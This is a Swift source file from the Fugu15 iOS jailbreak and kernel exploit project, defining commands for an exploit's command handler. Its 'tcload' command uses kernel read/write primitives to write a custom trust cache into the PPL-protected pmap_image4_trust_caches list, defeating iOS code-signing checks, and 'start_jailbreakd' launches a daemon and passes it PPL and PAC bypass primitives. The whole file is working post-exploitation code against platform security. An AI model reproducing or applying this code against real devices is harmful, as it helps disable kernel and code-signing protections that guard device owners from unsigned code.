//
//  iDownloadCmds.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//  Copyright Â© 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import iDownload
import MachO
import CBindings

let iDownloadCmds = [
    "help": iDownload_help,
    "autorun": iDownload_autorun,
    "tcload": iDownload_tcload,
    "start_jailbreakd": iDownload_jbdStart,
] as [String: iDownloadCmd]

func iDownload_help(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try hndlr.sendline("tcload <path to TrustCache>: Load a TrustCache")
}

func iDownload_autorun(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    try iDownload_tcload(hndlr, "tcload", ["/var/jb/basebin/basebin.tc"])
}

func iDownload_tcload(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    if args.count != 1 {
        try hndlr.sendline("Usage: tcload <path to TrustCache>")
        return
    }
    
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }
    
    let tcPath = hndlr.resolve(path: args[0])
    guard let data = try? Data(contentsOf: URL(fileURLWithPath: tcPath)) else {
        throw iDownloadError.custom("Failed to read trust cache!")
    }
    
    // Make sure the trust cache is good
    guard data.count >= 0x18 else {
        throw iDownloadError.custom("Trust cache is too small!")
    }
    
    let vers = data.getGeneric(type: UInt32.self)
    guard vers == 1 else {
        throw iDownloadError.custom(String(format: "Trust cache has bad version (must be 1, is %u)!", vers))
    }
    
    let count = data.getGeneric(type: UInt32.self, offset: 0x14)
    guard data.count == 0x18 + (Int(count) * 22) else {
        throw iDownloadError.custom(String(format: "Trust cache has bad length (should be %p, is %p)!", 0x18 + (Int(count) * 22), data.count))
    }
    
    guard let pmap_image4_trust_caches = Fugu15.patchfinder?.pmap_image4_trust_caches else {
        throw iDownloadError.custom("Failed to patchfind pmap_image4_trust_caches!")
    }
    
    var mem: UInt64!
    do {
        mem = try krw.kalloc(size: UInt(data.count + 0x10))
    } catch let e {
        throw KRWError.customError(description: "Failed to allocate kernel memory for TrustCache: \(e)")
    }
    
    let next = KRWAddress(address: mem, options: [])
    let us   = KRWAddress(address: mem + 0x8, options: [])
    let tc   = KRWAddress(address: mem + 0x10, options: [])
    
    do {
        try krw.kwrite(address: us, data: Data(fromObject: mem + 0x10))
        try krw.kwrite(address: tc, data: data)
    } catch let e {
        throw KRWError.customError(description: "Failed to write to our TrustCache: \(e)")
    }
    
    let pitc = KRWAddress(address: pmap_image4_trust_caches + hndlr.slide, options: .PPL)
    
    // Read head
    guard let cur = krw.r64(pitc) else {
        throw KRWError.customError(description: "Failed to read TrustCache head!")
    }
    
    // Write into our list entry
    try krw.kwrite(address: next, data: Data(fromObject: cur))
    
    // Replace head
    try krw.kwrite(address: pitc, data: Data(fromObject: mem.unsafelyUnwrapped))
    
    try hndlr.sendline("Successfully loaded TrustCache!")
}

func iDownload_jbdStart(_ hndlr: iDownloadHandler, _ cmd: String, _ args: [String]) throws {
    guard let krw = hndlr.krw else {
        throw iDownloadError.custom("No KRW support!")
    }

    var KcallStatus = 0 as UInt64, PPLRWStatus = 0 as UInt64, jbdPid = 0 as pid_t
    jbdGetStatus(&PPLRWStatus, &KcallStatus, &jbdPid)
    if jbdPid == 0 {
        try hndlr.sendline(String(format:"Starting jailbreakd..."))
        try hndlr.exec("/var/jb/basebin/kickstart", args: [])
        jbdGetStatus(&PPLRWStatus, &KcallStatus, &jbdPid)
    }

    if jbdPid == 0 {
        try hndlr.sendline(String(format:"Something went wrong... aborting"))
        return
    }

    try hndlr.sendline(String(format:"Got jailbreakd pid: \(jbdPid)"))

    if PPLRWStatus == 0 {
        try hndlr.sendline(String(format:"Sending PPL primitives to jailbreakd..."))
        let rsp = Fugu15.oobPCIRequest(id: 7, addrPid: UInt64(jbdPid))
        jbdTransferPPLRW(rsp.result)
        jbdGetStatus(&PPLRWStatus, &KcallStatus, &jbdPid)
        if PPLRWStatus == 1 {
            try hndlr.sendline(String(format:"Initialized PPL primitives inside jailbreakd!"))
        }
    }

    if KcallStatus == 0 {
        try hndlr.sendline(String(format:"Sending PAC primitives to jailbreakd"))
        let threadToSign = jbdTransferKcall()
        jbdGetStatus(&PPLRWStatus, &KcallStatus, &jbdPid)
        if KcallStatus == 1 {
            try hndlr.sendline(String(format:"Got thread to sign: 0x\(String(threadToSign, radix: 16, uppercase: true))"))
            let rsp2 = Fugu15.oobPCIRequest(id: 8, addrPid: threadToSign)
            jbdFinalizeKcall()
            jbdGetStatus(&PPLRWStatus, &KcallStatus, &jbdPid)
            if KcallStatus == 2 {
                try hndlr.sendline(String(format:"Initialized PAC primitives inside jailbreakd!"))
            }
            else {
                try hndlr.sendline(String(format:"Failed to finalize PAC primitives"))
                return
            }
        }
        else {
            try hndlr.sendline(String(format:"Failed to prepare PAC primitives"))
            return
        }
    }
}